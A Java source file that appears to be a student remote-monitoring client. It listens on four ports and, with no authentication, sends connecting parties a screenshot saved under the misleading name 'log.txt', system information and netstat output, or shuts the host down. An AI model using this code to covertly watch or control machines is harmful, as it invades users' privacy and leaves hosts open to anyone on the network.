package clienteproject;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import javax.imageio.ImageIO;
import Comon.Computador;

/**
 * Classe principal que roda no sistema cliente
 * @author Edson Vieira
 * @author Miguel Cabral
 */

public class Cliente {
	public static String SistemaOperacional = System.getProperties().getProperty("os.name");
	public static int[] porta = {5432, 5433, 5434, 5435};
	public static Computador pc;
	public static ServerSocket servsock;
	public static Socket sock;
	
	public static void main(String[] args) {
	
		while (true) {

			try {
				enviaComputador();
				System.out.println("Enviado\n");
			} catch (Exception e) { System.out.println(e.getMessage()); }
				
			try {
				enviaImagem();
			} catch (Exception e) { System.out.println(e.getMessage()); }
								
			try	{
				enviaPortasAtivas();
			} catch (Exception e) { System.out.println(e.getMessage()); }
		
			try {
				desligaDispositivo();
			} catch (Exception e) { System.out.println(e.getMessage()); }	
		
		}
}

	/** Verifica se o Sistema Operacional é Windows
	 * @return Verdadeiro se Windows
	 */
	public static boolean isWindows(){
        return (SistemaOperacional.indexOf("win") >= 0);
    }

	/** Verifica se o Sistema Operacional é Mac
	 * @return Verdadeiro se Mac
	 */
    public static boolean isMac()
    {
        return (SistemaOperacional.indexOf("mac") >= 0);
    }

	/** Verifica se o Sistema Operacional é Unix/Linux/AIX 
	 * @return Verdadeiro se Unix/Linux/AIX
	 */
    public static boolean isUnix()
    {
        return (SistemaOperacional.indexOf("nix") >= 0 || SistemaOperacional.indexOf("nux") >= 0 || SistemaOperacional.indexOf("aix") > 0 );
    }

	/** Gera imagem atual da tela do hospedeiro
	 * @return Arquivo com a imagem da tela atual
	 * @throws Exception caso não consiga registrar a imagem
	 */
	public static File printScreen() throws Exception{
		Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
		try{
			BufferedImage tela = (new Robot()).createScreenCapture(new Rectangle(0, 0, d.width, d.height));
			File arquivo = new File ("log.txt");
		    ImageIO.write(tela, "png", arquivo);
		    return arquivo;
		} catch (Exception e){ throw e;	}
	}
		
	/** Envia arquivo pelo socket informado
	 * @param sock
	 * @param myFile
	 * @return Verdadeiro se conseguir enviar, Falso caso contrário
	 */
	public static boolean enviaArquivo(Socket sock, File myFile){
		try{
			byte [] mybytearray  = new byte [(int)myFile.length()];
			BufferedInputStream bis = new BufferedInputStream(new FileInputStream(myFile));
			bis.read(mybytearray,0,mybytearray.length);
			OutputStream os = sock.getOutputStream();
			System.out.println("Enviando...");
				os.write(mybytearray,0,mybytearray.length);
				os.flush();
				bis.close();
				return true;
			}catch (Exception ioe){ return false; }
	}
	
	/** Envia um objeto computador
	 * @throws Exception
	 */
	public static void enviaComputador() throws Exception {
		servsock = new ServerSocket(porta[0]);
		sock = servsock.accept();
		pc = new Computador();
        ObjectOutputStream objoutstream = new ObjectOutputStream(sock.getOutputStream());
        objoutstream.writeObject(pc);
        objoutstream.close();
        sock.close();
	}
	
	/** Envia uma imagem da tela
	 * @throws Exception
	 */
	public static void enviaImagem() throws Exception {
		servsock = new ServerSocket(porta[1]);
		sock = servsock.accept();
		File myFile = printScreen();
		enviaArquivo(sock, myFile);
		//myFile.delete();
		sock.close();
	}
	
	/** Envia as portas ativas no dispositivo
	 * @throws Exception
	 */
	public static void enviaPortasAtivas() throws Exception {
		servsock = new ServerSocket(porta[2]);
		sock = servsock.accept();
		Runtime.getRuntime().exec("cmd /c netstat > netstat.txt");
		File myFile = new File ("netstat.txt");
		enviaArquivo(sock, myFile);
		//myFile.delete();
		sock.close();
	}
	
	/** Recebe um sinal de desligamento
	 * @throws Exception
	 */
	public static void desligaDispositivo() throws Exception {
		servsock = new ServerSocket(porta[3]); 
		sock = servsock.accept();
		if   (isWindows())	Runtime.getRuntime().exec ("cmd /c shutdown -s"); // (/f /p)??
    	else if  (isMac())	Runtime.getRuntime().exec ("shutdown");
    	else if (isUnix())	Runtime.getRuntime().exec ("poweroff");
			sock.close();
		}
}
